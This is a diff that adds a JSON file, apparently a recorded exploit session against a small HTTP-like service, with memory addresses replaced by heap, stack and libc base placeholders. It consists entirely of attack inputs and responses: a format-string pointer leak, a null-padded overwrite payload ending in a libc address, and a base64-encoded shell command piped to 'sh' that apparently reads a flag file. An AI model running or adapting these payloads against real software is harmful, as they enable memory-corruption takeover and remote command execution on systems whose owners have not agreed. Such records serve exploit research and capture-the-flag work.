@@ -1,0 +1,9 @@
+[
+    "1{{{HEAP_BASE:120919:3:ORI:0:0x6f6857}}} r u?\\n", 
+    "0AAAAAAAA%5p:%6p:%7p:%8p\\n", 
+    "1we{{{HEAP_BASE:119660:3:ORI:2:0x6f636c}}}me!AAAAAAAA0x{{{STACK_BASE:-18704:12:HEX:18:0x7ffde38ad6f0}}}:0x{{{LIBC_BASE:3958656:12:HEX:33:0x7fdfaca02780}}}:0x{{{LIBC_BASE:1012416:12:HEX:48:0x7fdfac7332c0}}}:0x7fdfacc29700", 
+    "0\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00{{{LIBC_BASE:987463:8:ORI:72:0x7fdfac72d147}}}\\n", 
+    "1HTTP/1.1 404{{{HEAP_BASE:114208:3:ORI:122:0x6f4e20}}}t{{{HEAP_BASE:112160:3:ORI:126:0x6f4620}}}und\\r{{{HEAP_BASE:111370:3:ORI:63:0x6f430a}}}n{{{HEAP_BASE:54644:3:ORI:67:0x6e6574}}}t-Type: text/html; charset=UTF-8\\r{{{HEAP_BASE:111370:3:ORI:63:0x6f430a}}}n{{{HEAP_BASE:54644:3:ORI:67:0x6e6574}}}t-{{{HEAP_BASE:54604:3:ORI:72:0x6e654c}}}gth: 23\\r\\nServer: EasyServer ({{{HEAP_BASE:55628:3:ORI:104:0x6e694c}}}ux)\\r\\n\\r\\n<h3>Page{{{HEAP_BASE:114208:3:ORI:122:0x6f4e20}}}t{{{HEAP_BASE:112160:3:ORI:126:0x6f4620}}}und</h3>", 
+    "0e{{{HEAP_BASE:120931:3:ORI:1:0x6f6863}}} \"Y2F0IC9mb{{{HEAP_BASE:46663:3:ORI:35:0x6e4647}}}cy9mYWtlL{{{HEAP_BASE:48727:3:ORI:27:0x6e4e57}}}aS9mb{{{HEAP_BASE:46663:3:ORI:35:0x6e4647}}}IHxiYXNlNjQK\" |base64 -d |sh\\n", 
+    "2sh: 1: base64{{{HEAP_BASE:36922:3:ORI:13:0x6e203a}}}ot{{{HEAP_BASE:120352:3:ORI:18:0x6f6620}}}und\\n"
+]
